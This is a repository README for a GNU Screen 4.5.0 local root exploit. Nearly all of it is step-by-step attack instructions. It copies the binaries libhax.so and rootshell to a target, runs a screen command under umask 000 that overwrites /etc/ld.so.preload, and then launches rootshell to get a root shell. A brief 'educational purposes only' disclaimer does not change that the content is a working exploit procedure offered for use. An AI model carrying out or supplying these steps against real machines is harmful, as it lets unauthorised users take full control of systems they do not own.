# GNU Screen-4.5.0 Local-Privilege-Escalation


---

# Screenroot Exploit

This repository contains the binary files `libhax.so` and `rootshell`, which are part of a local root exploit for screen version 4.5.0. This exploit abuses `ld.so.preload` overwriting to escalate privileges.

## Disclaimer
This code is for educational purposes only. Do not use this exploit on systems you do not own or have explicit permission to test.

## Requirements
- A machine with `screen` version 4.5.0 or a vulnerable version installed.
- Access to the target machine where you can transfer and execute the binaries.

## Exploit Execution

### 1. Clone this repository
First, clone the repository to your local machine:

```bash
git clone https://github.com/H420Prajyot/Screen-4.5.0--Exploit.git
cd Screen-4.5.0--Exploit
```

### 2. Transfer the binaries
Copy the `libhax.so` and `rootshell` binaries to the target machine. You can use `scp` or another method of file transfer:

```bash
scp libhax.so rootshell user@target:/tmp/
```

### 3. Set the appropriate permissions
On the target machine, change the permissions of the `rootshell` binary:

```bash
chmod +x /tmp/rootshell
```

### 4. Exploit the vulnerability
To exploit the vulnerability, run the following commands on the target machine:

```bash
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
```

This overwrites `ld.so.preload`, which allows the exploit to escalate privileges.

### 5. Trigger the exploit
Now, trigger the `rootshell` to obtain a root shell:

```bash
/tmp/rootshell
```

You should now have root access.

---

